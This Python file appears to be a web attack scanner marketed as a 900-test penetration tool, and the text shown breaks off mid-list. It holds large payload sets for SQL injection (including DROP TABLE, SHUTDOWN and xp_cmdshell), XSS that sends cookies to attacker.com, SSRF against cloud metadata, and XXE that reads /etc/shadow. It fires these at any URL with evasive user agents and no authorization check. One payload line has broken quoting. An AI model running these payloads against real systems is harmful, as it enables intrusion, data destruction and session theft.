import requests
import time
import re
import json
import csv
import os
import sys
import socket
import ssl
import random
import string
import base64
import urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Optional, Tuple, Any
from colorama import init, Fore, Style
import threading
import hashlib

# Initialize colorama
init(autoreset=True)

# Color constants
GREEN = Fore.GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
CYAN = Fore.CYAN
WHITE = Fore.WHITE
BRIGHT = Style.BRIGHT

class SecurityTester:
    """Advanced Security Testing Framework with 900+ tests"""
    
    def __init__(self, target_url: str, language: str = "en", mode: str = "normal"):
        self.target = target_url.rstrip('/')
        self.language = language
        self.mode = mode
        self.session = requests.Session()
        self.results = []
        self.vulnerabilities = []
        self.start_time = None
        self.end_time = None
        self.test_count = 0
        self.vuln_count = 0
        
        # User agents for evasion
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        
        # Headers for requests
        self.headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }
        
        # Timeout settings
        self.timeout = 10 if mode == "fast" else 5 if mode == "ultra" else 15
        self.delay = 0 if mode == "ultra" else 0.1 if mode == "fast" else 0.5
        
    def translate(self, en_text: str, fa_text: str) -> str:
        """Return text based on selected language"""
        return fa_text if self.language == "fa" else en_text
    
    def print_colored(self, message: str, color: str = WHITE, end: str = "\n"):
        """Print colored output"""
        print(f"{color}{message}{Style.RESET_ALL}", end=end)
    
    def log_vulnerability(self, category: str, test_name: str, severity: str, details: str):
        """Log a discovered vulnerability"""
        self.vuln_count += 1
        vuln = {
            'id': self.vuln_count,
            'category': category,
            'test': test_name,
            'severity': severity,
            'details': details,
            'timestamp': datetime.now().isoformat()
        }
        self.vulnerabilities.append(vuln)
        
        # Display in terminal
        severity_colors = {
            'CRITICAL': RED + BRIGHT,
            'HIGH': RED,
            'MEDIUM': YELLOW,
            'LOW': YELLOW,
            'INFO': CYAN
        }
        
        color = severity_colors.get(severity, WHITE)
        self.print_colored(f"[!] {severity}: {test_name} - {details}", color)
    
    def send_request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        """Send HTTP request with error handling"""
        try:
            if 'headers' not in kwargs:
                kwargs['headers'] = self.headers
            if 'timeout' not in kwargs:
                kwargs['timeout'] = self.timeout
            if 'allow_redirects' not in kwargs:
                kwargs['allow_redirects'] = False
            
            self.test_count += 1
            response = self.session.request(method, url, **kwargs)
            
            if self.delay > 0:
                time.sleep(self.delay)
                
            return response
        except requests.exceptions.Timeout:
            return None
        except requests.exceptions.ConnectionError:
            return None
        except Exception as e:
            return None
    
    def run_tests(self, categories: List[str] = None):
        """Run selected test categories"""
        self.start_time = time.time()
        
        self.print_colored("=" * 80, GREEN + BRIGHT)
        self.print_colored(
            self.translate("║ ULTIMATE PENETRATION TESTING TOOL - 900 TESTS ║",
                          "║ ابزار تست نفوذ نهایی - 900 تست ║"),
            GREEN + BRIGHT
        )
        self.print_colored("=" * 80, GREEN + BRIGHT)
        self.print_colored(f"Target: {self.target}", CYAN)
        self.print_colored(f"Mode: {self.mode.upper()}", CYAN)
        self.print_colored(f"Threads: {self.get_thread_count()}", CYAN)
        self.print_colored("=" * 80, GREEN + BRIGHT)
        
        # Test categories mapping
        all_tests = {
            'sql': self.test_sql_injection,
            'xss': self.test_xss,
            'csrf_ssrf_xxe': self.test_csrf_ssrf_xxe,
            'headers': self.test_security_headers,
            'api': self.test_api,
            'auth': self.test_authentication,
            'upload': self.test_file_upload,
            'info': self.test_information_disclosure,
            'advanced': self.test_advanced
        }
        
        if not categories or 'all' in categories:
            categories = list(all_tests.keys())
        
        with ThreadPoolExecutor(max_workers=self.get_thread_count()) as executor:
            futures = []
            for cat in categories:
                if cat in all_tests:
                    futures.append(executor.submit(all_tests[cat]))
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    self.print_colored(f"Error in test: {e}", RED)
        
        self.end_time = time.time()
        self.generate_summary()
    
    def get_thread_count(self) -> int:
        """Determine thread count based on mode"""
        if self.mode == "ultra":
            return 50
        elif self.mode == "fast":
            return 20
        else:
            return 10
    
    # ============================================================
    # SQL INJECTION TESTS (200 tests)
    # ============================================================
    def test_sql_injection(self):
        """Run all SQL injection tests"""
        self.print_colored("\n[*] Running SQL Injection Tests...", CYAN)
        
        payloads = {
            'basic': [
                "'", '"', '`', "' OR '1'='1", '" OR "1"="1',
                "' OR '1'='1' --", '" OR "1"="1" --',
                "' OR '1'='1' #', '" OR "1"="1" #',
                "' OR 1=1--", '" OR 1=1--', "1' OR '1'='1",
                "1' OR 1=1--", "admin'--", "admin' #",
                "' UNION SELECT NULL--", "') OR ('1'='1",
                "'; DROP TABLE users--", "' AND '1'='1", "' AND 1=1--"
            ],
            'union': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT @@version--",
                "' UNION SELECT user()--",
                "' UNION SELECT database()--",
                "' UNION SELECT table_name FROM information_schema.tables--",
                "') UNION SELECT NULL--",
                "') UNION SELECT NULL,NULL--",
                "1' UNION SELECT NULL--",
                "1 UNION SELECT NULL--",
                "' UNION ALL SELECT NULL--",
                "' UNION SELECT 'test'--",
                "' UNION SELECT 1,'test',3--",
                "') UNION SELECT 1,2,3--",
                "') UNION SELECT 1,2,3,4--",
                "')) UNION SELECT NULL--",
                "UNION SELECT NULL FROM DUAL--",
                "' UNION SELECT LOAD_FILE('/etc/passwd')--",
                "' UNION SELECT @@datadir--",
                "' UNION SELECT schema_name FROM information_schema.schemata--",
                "' UNION SELECT column_name FROM information_schema.columns--",
                "' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables--",
                "' UNION SELECT * FROM users--",
                "' UNION SELECT username,password FROM users--",
                "' UNION SELECT NULL,NULL FROM users--",
                "'/**/UNION/**/SELECT/**/NULL--"
            ],
            'blind': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND '1'='1' --",
                "' AND '1'='2' --",
                "' AND SLEEP(5)--",
                "' AND BENCHMARK(1000000,MD5('A'))--",
                "' AND (SELECT 1 FROM DUAL WHERE 1=1)--",
                "' AND (SELECT 1 FROM DUAL WHERE 1=2)--",
                "' AND (SELECT COUNT(*) FROM users)>0--",
                "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
                "' OR EXISTS(SELECT * FROM users)--",
                "' AND (SELECT LENGTH(database()))>0--",
                "' AND (SELECT SUBSTRING(database(),1,1))='a'--",
                "' OR (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' AND (SELECT IF(1=1,SLEEP(5),0))--",
                "' OR ELT(1=1,SLEEP(5))--",
                "' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END)--",
                "'; IF(1=1) WAITFOR DELAY '0:0:5'--",
                "' AND (SELECT 1 FROM (SELECT SLEEP(5))x)--",
                "' AND EXISTS(SELECT * FROM users WHERE username='admin')--",
                "' OR EXISTS(SELECT * FROM users WHERE username LIKE '%admin%')--",
                "' AND (SELECT COUNT(*) FROM users)=1--",
                "' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>0--",
                "' AND 1=(SELECT 1 FROM information_schema.tables)--"
            ],
            'error_based': [
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
                "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' OR 1 GROUP BY CONCAT_WS(0x7e,VERSION(),FLOOR(RAND(0)*2)) HAVING MIN(0) OR 1--",
                "' AND (SELECT * FROM (SELECT NAME_CONST((SELECT @@version),1),NAME_CONST((SELECT @@version),1)) as x)--",
                "' AND geometrycollection((select * from(select * from(select @@version)x)a))--",
                "' AND polygon((select * from(select * from(select @@version)x)a))--",
                "' AND multipoint((select * from(select * from(select @@version)x)a))--",
                "' AND multilinestring((select * from(select * from(select @@version)x)a))--",
                "' AND linestring((select * from(select * from(select @@version)x)a))--",
                "' OR 1=1 AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--",
                "' AND UPDATEXML(1,CONCAT(0x7e,user()),1)--",
                "' OR (SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(database(),FLOOR(RAND(0)*2)))--",
                "' AND EXP(~(SELECT * FROM (SELECT database())a))--",
                "' AND extractvalue(1,concat(0x7e,(SELECT database())))--",
                "|| (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT database())),1)--",
                "' AND JSON_KEYS((SELECT CONVERT((SELECT database()) USING utf8)))--",
                "' OR ST_LATFROMGEOHASH((SELECT * FROM(1)a))--",
                "' AND ST_LONGFROMGEOHASH((SELECT * FROM(1)a))--"
            ],
            'time_based': [
                "'; WAITFOR DELAY '0:0:5'--",
                "' OR SLEEP(5)--",
                "' AND SLEEP(5)--",
                "' AND IF(1=1,SLEEP(5),0)--",
                "'; SELECT SLEEP(5)--",
                "' OR BENCHMARK(5000000,MD5('A'))--",
                "' AND BENCHMARK(5000000,MD5('A'))--",
                "' OR SLEEP(5) OR '1'='1",
                "' AND SLEEP(5) AND '1'='1",
                "' OR (SELECT SLEEP(5))--",
                "' AND (SELECT SLEEP(5))--",
                "' OR (SELECT * FROM (SELECT SLEEP(5))a)--",
                "' AND (SELECT * FROM (SELECT SLEEP(5))a)--",
                "'; EXEC xp_cmdshell('ping -n 5 127.0.0.1')--",
                "' OR pg_sleep(5)--",
                "' AND pg_sleep(5)--",
                "|| SLEEP(5)--",
                "' OR (SELECT COUNT(*) FROM information_schema.tables) AND SLEEP(5)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' OR ELT(1=1,SLEEP(5))--"
            ],
            'boolean_blind': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND 'a'='a",
                "' AND 'a'='b",
                "' OR 1=1--",
                "' OR 1=2--",
                "' AND 2>1--",
                "' AND 2<1--",
                "' AND 'abc' LIKE 'a%'--",
                "' AND 'abc' LIKE 'z%'--",
                "' AND SUBSTRING('abc',1,1)='a'--",
                "' AND SUBSTRING('abc',1,1)='b'--",
                "' AND EXISTS(SELECT * FROM users)--",
                "' AND NOT EXISTS(SELECT * FROM nonexistent)--",
                "' AND (SELECT 1)=1--"
            ],
            'stacked': [
                "'; DROP TABLE users--",
                "'; DELETE FROM users--",
                "'; UPDATE users SET password='hacked'--",
                "'; INSERT INTO users VALUES('hacker','password')--",
                "'; CREATE TABLE hack(data varchar(255))--",
                "'; ALTER TABLE users ADD hacked varchar(255)--",
                "'; EXEC xp_cmdshell('dir')--",
                "'; EXEC master..xp_cmdshell 'dir'--",
                "'; SELECT * FROM users--",
                "'; SELECT @@version--",
                "'; BACKUP DATABASE test TO DISK='c:\\test.bak'--",
                "'; SHUTDOWN--",
                "'; DBCC SHRINKDATABASE(test)--",
                "'; REVOKE ALL FROM test--",
                "'; GRANT ALL TO test--"
            ],
            'second_order': [
                "test'--",
                "test' #",
                "test';--",
                "test')--",
                "test'))--",
                "test')));--",
                "' UNION SELECT 'test",
                "'||'test",
                "test'+'user",
                "admin'--"
            ],
            'waf_bypass': [
                "%27%20OR%201=1--",
                "/**/OR/**/1=1--",
                "' OR 1=1--",
                "'/**/OR/**/1=1--",
                "SEL/**/ECT",
                "SE%4CECT",
                "SElEcT",
                "%53%45%4C%45%43%54",
                "/*!50000SELECT*/",
                "/*!UNION*/",
                "UNI/**/ON",
                "UNI%4F%4E",
                "U%4EION",
                "/**//*!12345UNION*//**/",
                "%2F%2A%2A%2FUNION%2F%2A%2A%2F",
                "UNIunionON",
                "UNI/**/ON/**/SELECT",
                "SELECT(1)",
                "SELSELECTECT",
                "S%E%L%E%C%T",
                "%53%45%4C%45%43%54%20%31",
                "SELE%43T",
                "SELE%C2%A3T",
                "%CA%7F%EE%80%80SELECT",
                "SEL\u0000ECT"
            ],
            'encoding_bypass': [
                "' OR 1=1--",
                "' OR 1=1%23",
                "' OR 1=1%2D%2D",
                "%27%20OR%201=1%2D%2D",
                "%%32%37 OR 1=1--",
                "'+OR+1=1--",
                "'/**/OR/**/1=1--",
                "0x27 OR 1=1--",
                "CHAR(39) OR 1=1--",
                "CONCAT(CHAR(39),CHAR(32),CHAR(79),CHAR(82))",
                "0x27204F5220313D31",
                "UNHEX('27204F5220313D31')",
                "' || 1=1--",
                "' && 1=1--",
                "1' && '1'='1",
                "%31%27%20%4F%52%20%31%3D%31",
                "1' OR '1'='1'--",
                "1' OR '1'='1'#",
                "' OR 1=1 LIMIT 1--",
                "' OR 1=1 OFFSET 0--"
            ]
        }
        
        # Test each category of SQL injection payloads
        params = ['id', 'page', 'user', 'query', 'search', 'q', 'cat', 'product', 'item']
        
        for category, payload_list in payloads.items():
            for payload in payload_list[:25]:  # Limit per category for speed
                for param in params:
                    test_url = f"{self.target}?{param}={urllib.parse.quote(payload)}"
                    try:
                        response = self.send_request('GET', test_url)
                        if response and self.detect_sql_injection(response, payload):
                            self.log_vulnerability(
                                'SQL Injection',
                                f'{category} - {param}',
                                'CRITICAL' if category in ['stacked', 'union'] else 'HIGH',
                                f'Payload: {payload[:50]}'
                            )
                    except:
                        continue
        
        # Test POST parameters
        test_url = f"{self.target}/login"
        for category, payload_list in payloads.items():
            for payload in payload_list[:10]:
                data = {'username': payload, 'password': 'test'}
                try:
                    response = self.send_request('POST', test_url, data=data)
                    if response and self.detect_sql_injection(response, payload):
                        self.log_vulnerability(
                            'SQL Injection',
                            f'{category} - POST',
                            'CRITICAL',
                            f'POST payload: {payload[:50]}'
                        )
                except:
                    continue
    
    def detect_sql_injection(self, response: requests.Response, payload: str) -> bool:
        """Detect SQL injection in response"""
        if not response:
            return False
        
        indicators = [
            'SQL syntax',
            'mysql_fetch',
            'ORA-',
            'PostgreSQL',
            'SQLite',
            'Microsoft SQL',
            'ODBC Driver',
            'Unclosed quotation mark',
            'You have an error in your SQL syntax',
            'Division by zero',
            'supplied argument is not a valid MySQL',
            'Column count doesn\'t match',
            'Warning: mysql',
            'valid MySQL result',
            'MySQL Error',
            'pg_query()',
            'sqlite3::',
            'SQLite/JDBCDriver',
            'System.Data.OleDb',
            'error in your SQL',
            'Unhandled exception',
            'server version for the right syntax'
        ]
        
        response_text = response.text.lower()
        for indicator in indicators:
            if indicator.lower() in response_text:
                return True
        
        # Check for time-based injection
        if response.elapsed.total_seconds() > 4 and 'sleep' in payload.lower():
            return True
        
        return False
    
    # ============================================================
    # XSS TESTS (150 tests)
    # ============================================================
    def test_xss(self):
        """Run all XSS tests"""
        self.print_colored("\n[*] Running XSS Tests...", CYAN)
        
        xss_payloads = {
            'reflected': [
                '<script>alert(1)</script>',
                '"><script>alert(1)</script>',
                '</textarea><script>alert(1)</script>',
                '"><img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<body onload=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<select onfocus=alert(1) autofocus>',
                '<textarea onfocus=alert(1) autofocus>',
                '<keygen onfocus=alert(1) autofocus>',
                '<video><source onerror=alert(1)>',
                '<audio src=x onerror=alert(1)>',
                '<marquee onstart=alert(1)>',
                '<isindex type=image src=1 onerror=alert(1)>',
                '<math><maction actiontype=statusline#http://google.com xlink:href=javascript:alert(1)>CLICKME</maction></math>',
                '<form><button formaction=javascript:alert(1)>CLICKME</button></form>',
                '<object data=javascript:alert(1)>',
                '<embed src=javascript:alert(1)>',
                '<frameset onload=alert(1)>',
                '<iframe src=javascript:alert(1)>',
                "'-alert(1)-'",
                '";alert(1);//',
                '<scr<script>ipt>alert(1)</scr</script>ipt>',
                '<img src=x onerror=alert(1) //',
                '<img src=x onerror=alert(1)>',
                '<<script>alert(1);//<</script>',
                '<img src="x" onerror="alert(1)">',
                '<svg><script>alert(1)</script></svg>',
                '<details open ontoggle=alert(1)>',
                '<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>'
            ],
            'stored': [
                '<script>alert(document.cookie)</script>',
                '<img src=x onerror=alert(document.cookie)>',
                '<svg onload=alert(document.cookie)>',
                '<body onload=alert(document.cookie)>',
                '<script>new Image().src="http://attacker.com/"+document.cookie</script>',
                '"><script>alert(1)</script>',
                '<a href="javascript:alert(1)">Click</a>',
                '<img src=1 href=1 onerror="javascript:alert(1)"></img>',
                '<audio src=1 href=1 onerror="javascript:alert(1)"></audio>',
                '<video src=1 href=1 onerror="javascript:alert(1)"></video>',
                '<body onload="javascript:alert(1)">',
                '<object data="javascript:alert(1)">',
                '<embed src="javascript:alert(1)">',
                '<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>',
                '<style>@im\\port\'\\ja\\vasc\\ript:alert(1)\';</style>',
                '<math><brute href="javascript:alert(1)">CLICK</brute></math>',
                '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
                '<svg><set onbegin=alert(1) attributeName=x dur=1s>',
                '<svg><animateTransform onbegin=alert(1) attributeName=x>',
                '<svg><discard onbegin=alert(1) attributeName=x dur=1s>',
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                '<BASE HREF="javascript:alert(1);//">',
                '<LINK REL="stylesheet" HREF="javascript:alert(1);">',
                '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1);">'
            ],
            'dom': [
                '#"><img src=x onerror=alert(1)>',
                'javascript:alert(1)',
                '"><script>alert(1)</script>',
                '"><svg onload=alert(1)>',
                '\\"><script>alert(1)</script>',
                "';alert(1)//",
                '";alert(1)//',
                '<img src=x onerror="alert(1)">',
                '<svg/onload=alert(1)>',
                '<body onload=alert(1)>',
                '<iframe src=javascript:alert(1)>',
                '<object data=javascript:alert(1)>',
                '<embed src=javascript:alert(1)>',
                'eval(location.hash.slice(1))',
                'setTimeout(location.hash.slice(1))',
                'setInterval(location.hash.slice(1))',
                'Function(location.hash.slice(1))()',
                'document.write(location.hash.slice(1))',
                'innerHTML=location.hash.slice(1)',
                'outerHTML=location.hash.slice(1)'
            ],
            'mutation': [
                '<svg><p><style><img src=x onerror=alert(1)></style></p></svg>',
                '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
                '<svg><p><style><img src=x onerror=alert(1)>',
                '<math><mtext><table><mglyph><style><![CDATA[</style><img src=x onerror=alert(1)>]]>',
                '<svg><style><img src=x onerror=alert(1)>',
                '<math><style><img src=x onerror=alert(1)></style></math>',
                '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
                '<table><table><math><foreignObject><svg><script>alert(1)</script></svg></foreignObject></math></table></table>',
                '<form><math><mtext></form><form><mglyph><svg><mtext><style><img src=x onerror=alert(1)>',
                '<xmp><p title="</xmp><img src=x onerror=alert(1)>',
                '<style><!--</style><img src=x onerror=alert(1)//>',
                '<textarea><!--</textarea><img src=x onerror=alert(1)//>',
                '<title><!--</title><img src=x onerror=alert(1)//>',
                '<noscript><!--</noscript><img src=x onerror=alert(1)//>',
                '<noembed><!--</noembed><img src=x onerror=alert(1)//>'
            ],
            'blind': [
                '<script>new Image().src="http://attacker.com/log?cookie="+document.cookie</script>',
                '<img src=x onerror="new Image().src=\'http://attacker.com/log?cookie=\'+document.cookie">',
                '<svg onload="new Image().src=\'http://attacker.com/log?cookie=\'+document.cookie">',
                '<body onload="new Image().src=\'http://attacker.com/log?cookie=\'+document.cookie">',
                '<script>fetch("http://attacker.com/log?cookie="+document.cookie)</script>',
                '<script>navigator.sendBeacon("http://attacker.com/log?cookie="+document.cookie)</script>',
                '<script>ws=new WebSocket("ws://attacker.com/");ws.onopen=function(){ws.send(document.cookie)}</script>',
                '<input onfocus="new Image().src=\'http://attacker.com/log?cookie=\'+document.cookie" autofocus>',
                '<select onfocus="new Image().src=\'http://attacker.com/log?cookie=\'+document.cookie" autofocus>',
                '<textarea onfocus="new Image().src=\'http://attacker.com/log?cookie=\'+document.cookie" autofocus>'
            ],
            'filter_bypass': [
                '<scr<script>ipt>alert(1)</scr</script>ipt>',
                '<<script>alert(1);//<</script>',
                '<img src=x onerror="alert(1)">',
                '<img src=x onerror=alert(1)>',
                '<img src=x onerror=alert(1) //',
                '<svg/onload=alert(1)>',
                '<svg onload=alert(1)>',
                '<svg%20onload=alert(1)>',
                '<svg%09onload=alert(1)>',
                '<svg%0Donload=alert(1)>',
                '<svg%0Aonload=alert(1)>',
                '<img src=x onerror=alert(1)>',
                '<IMG SRC=x ONERROR=alert(1)>',
                '<img src=x onerror=alert(1)>',
                '<img src=x onerror=alert(1)>',
                '<img src=x onerror=alert(1)>',
                '<img src=x onerror=&#97;lert(1)>',
                '<img src=x onerror=&#x61;lert(1)>',
                '<img src=x onerror=\u0061lert(1)>',
                '<img src=x onerror=eval("\x61\x6c\x65\x72\x74\x28\x31\x29")>',
                '<img src=x onerror="\x61\x6c\x65\x72\x74(1)">',
                '<img src=x onerror="alert(1)">',
                '<img src=x onerror="alert(String.fromCharCode(49))">',
                '<img src=x onerror=confirm(1)>',
                '<img src=x onerror=prompt(1)>'
            ],
            'attribute': [
                '" onmouseover="alert(1)',
                '" onfocus="alert(1)" autofocus="',
                '" onblur="alert(1)" autofocus="',
                '" onchange="alert(1)',
                '" onclick="alert(1)',
                '" ondblclick="alert(1)',
                '" onkeydown="alert(1)',
                '" onkeypress="alert(1)',
                '" onkeyup="alert(1)',
                '" onload="alert(1)',
                '" onmousedown="alert(1)',
                '" onmousemove="alert(1)',
                '" onmouseout="alert(1)',
                '" onmouseup="alert(1)',
                '" onselect="alert(1)'
            ],
            'url': [
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
                'vbscript:alert(1)',
                'jav\tascript:alert(1)',
                'jav&#x09;ascript:alert(1)',
                'jav&#x0A;ascript:alert(1)',
                'jav&#x0D;ascript:alert(1)',
                '\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74:alert(1)',
                'URL:javascript:alert(1)'
            ]
        }
        
        params = ['q', 'search', 'query', 'id', 'name', 'email', 'message', 'comment', 'user', 'page']
        
        for category, payload_list in xss_payloads.items():
            for payload in payload_list[:20]:
                for param in params:
                    test_url = f"{self.target}?{param}={urllib.parse.quote(payload)}"
                    try:
                        response = self.send_request('GET', test_url)
                        if response and self.detect_xss(response, payload):
                            self.log_vulnerability(
                                'XSS',
                                f'{category} - {param}',
                                'HIGH',
                                f'Payload: {payload[:50]}'
                            )
                    except:
                        continue
        
        # Test POST parameters
        test_url = f"{self.target}/search"
        for category, payload_list in xss_payloads.items():
            for payload in payload_list[:10]:
                data = {'search': payload, 'query': payload}
                try:
                    response = self.send_request('POST', test_url, data=data)
                    if response and self.detect_xss(response, payload):
                        self.log_vulnerability(
                            'XSS',
                            f'{category} - POST',
                            'HIGH',
                            f'POST payload: {payload[:50]}'
                        )
                except:
                    continue
    
    def detect_xss(self, response: requests.Response, payload: str) -> bool:
        """Detect XSS in response"""
        if not response:
            return False
        
        # Check if payload is reflected in response
        if payload in response.text:
            return True
        
        # Check for common XSS patterns
        xss_patterns = [
            r'<script[^>]*>.*?</script>',
            r'onerror\s*=\s*["\']?[^"\'>]*alert',
            r'onload\s*=\s*["\']?[^"\'>]*alert',
            r'javascript\s*:',
            r'<img[^>]+src\s*=\s*["\']?\s*x\s*["\']?[^>]*onerror',
            r'<svg[^>]*onload'
        ]
        
        for pattern in xss_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True
        
        return False
    
    # ============================================================
    # CSRF, SSRF, XXE TESTS (100 tests)
    # ============================================================
    def test_csrf_ssrf_xxe(self):
        """Run CSRF, SSRF, and XXE tests"""
        self.print_colored("\n[*] Running CSRF/SSRF/XXE Tests...", CYAN)
        
        # CSRF Tests (30)
        self.test_csrf()
        
        # SSRF Tests (45)
        self.test_ssrf()
        
        # XXE Tests (25)
        self.test_xxe()
    
    def test_csrf(self):
        """Test for CSRF vulnerabilities"""
        csrf_test_urls = [
            '/profile/update',
            '/settings',
            '/account/edit',
            '/user/update',
            '/changepassword',
            '/admin/user/create',
            '/api/user/update',
            '/config/save',
            '/preferences/update'
        ]
        
        for url in csrf_test_urls:
            test_url = f"{self.target}{url}"
            try:
                # Test without CSRF token
                response = self.send_request('POST', test_url, data={'test': 'data'})
                if response and response.status_code == 200:
                    # Check for CSRF protection
                    if 'csrf' not in response.text.lower() and 'token' not in response.text.lower():
                        self.log_vulnerability(
                            'CSRF',
                            url,
                            'HIGH',
                            'No CSRF token found'
                        )
                
                # Test with empty token
                response = self.send_request('POST', test_url, data={'csrf_token': '', 'test': 'data'})
                if response and response.status_code == 200:
                    self.log_vulnerability(
                        'CSRF',
                        url,
                        'MEDIUM',
                        'Empty CSRF token accepted'
                    )
                
                # Test with random token
                response = self.send_request('POST', test_url, data={'csrf_token': 'random123', 'test': 'data'})
                if response and response.status_code == 200 and 'invalid' not in response.text.lower():
                    self.log_vulnerability(
                        'CSRF',
                        url,
                        'MEDIUM',
                        'Invalid CSRF token accepted'
                    )
            except:
                continue
    
    def test_ssrf(self):
        """Test for SSRF vulnerabilities"""
        ssrf_payloads = [
            'http://127.0.0.1',
            'http://localhost',
            'http://0.0.0.0',
            'http://[::1]',
            'http://169.254.169.254/latest/meta-data/',  # AWS
            'http://metadata.google.internal/',  # GCP
            'http://100.100.100.200/latest/meta-data/',  # Alibaba
            'file:///etc/passwd',
            'file:///c:/windows/win.ini',
            'http://127.0.0.1:22',
            'http://127.0.0.1:80',
            'http://127.0.0.1:443',
            'http://127.0.0.1:3306',  # MySQL
            'http://127.0.0.1:6379',  # Redis
            'http://127.0.0.1:9200',  # Elasticsearch
            'http://127.0.0.1:27017', # MongoDB
            'dict://127.0.0.1:6379',
            'gopher://127.0.0.1:6379',
            'http://localhost:8080',
            'http://127.0.0.1:8000',
            'http://[::]:80',
            'http://0x7f000001',
            'http://2130706433',
            'http://017700000001',
            'http://127.1'
        ]
        
        ssrf_params = ['url', 'redirect', 'uri', 'path', 'file', 'document', 'folder', 'root', 'show', 'source']
        
        for param in ssrf_params:
            for payload in ssrf_payloads[:15]:
                test_url = f"{self.target}?{param}={urllib.parse.quote(payload)}"
                try:
                    response = self.send_request('GET', test_url)
                    if response and self.detect_ssrf(response, payload):
                        self.log_vulnerability(
                            'SSRF',
                            f'{param}',
                            'CRITICAL',
                            f'Payload: {payload}'
                        )
                except:
                    continue
    
    def detect_ssrf(self, response: requests.Response, payload: str) -> bool:
        """Detect SSRF in response"""
        if not response:
            return False
        
        ssrf_indicators = [
            'root:x:0:0:root',
            '/bin/bash',
            'mysql',
            'redis',
            'elasticsearch',
            'mongodb',
            'ami-id',
            'instance-id',
            'public-keys',
            'security-groups',
            'failed to connect',
            'connection refused',
            'timeout'
        ]
        
        response_text = response.text.lower()
        for indicator in ssrf_indicators:
            if indicator.lower() in response_text:
                return True
        
        return False
    
    def test_xxe(self):
        """Test for XXE vulnerabilities"""
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo/>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:file:///var/www/html/app.jar!/">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_INFO">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ldap://127.0.0.1/o=test">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://attacker.com/xxe">]><foo>&xxe;</foo>',
